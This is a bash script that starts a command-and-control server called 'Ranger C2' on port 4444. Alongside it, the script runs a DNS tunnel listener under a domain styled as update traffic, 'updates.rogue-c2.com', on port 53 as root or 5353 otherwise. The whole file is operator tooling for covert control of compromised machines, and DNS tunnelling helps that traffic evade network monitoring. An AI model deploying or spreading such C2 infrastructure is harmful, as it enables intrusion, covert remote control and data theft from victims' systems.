#!/bin/bash
# Start Ranger C2 with DNS tunneling enabled

echo "Starting Ranger C2 with DNS tunneling..."

# Kill any existing C2 processes
pkill -f "python3 c2.py" 2>/dev/null
sleep 2

# Start DNS listener (requires root for port 53)
if [ "$EUID" -eq 0 ]; then
    echo "Starting DNS listener on port 53..."
    python3 -c "
import sys
sys.path.append('.')
from payloads.dnstunnel import DNSTunnel
import threading
import time

tunnel = DNSTunnel(
    domain='updates.rogue-c2.com',
    mode='server',
    listen_ip='0.0.0.0',
    listen_port=53
)

def run_dns():
    tunnel.start_server()

dns_thread = threading.Thread(target=run_dns, daemon=True)
dns_thread.start()
print('[+] DNS tunnel server started on port 53')

# Keep script running
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print('\n[+] Stopping DNS tunnel...')
" &
    DNS_PID=$!
    echo "DNS listener PID: $DNS_PID"
else
    echo "Warning: Not running as root, DNS listener will use port 5353"
    python3 -c "
import sys
sys.path.append('.')
from payloads.dnstunnel import DNSTunnel
import threading
import time

tunnel = DNSTunnel(
    domain='updates.rogue-c2.com',
    mode='server',
    listen_ip='0.0.0.0',
    listen_port=5353
)

def run_dns():
    tunnel.start_server()

dns_thread = threading.Thread(target=run_dns, daemon=True)
dns_thread.start()
print('[+] DNS tunnel server started on port 5353')

# Keep script running
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print('\n[+] Stopping DNS tunnel...')
" &
    DNS_PID=$!
    echo "DNS listener PID: $DNS_PID"
fi

# Start C2 server
echo "Starting C2 server on port 4444..."
python3 c2.py --enable-dns &
C2_PID=$!
echo "C2 server PID: $C2_PID"

echo ""
echo "=========================================="
echo "Ranger C2 with DNS tunneling is running!"
echo "=========================================="
echo "C2 Server: http://localhost:4444"
echo "DNS Domain: *.updates.rogue-c2.com"
echo "DNS Port: $(if [ "$EUID" -eq 0 ]; then echo 53; else echo 5353; fi)"
echo ""
echo "To stop: kill $C2_PID $DNS_PID"
echo "=========================================="

# Wait for user to press Ctrl+C
wait
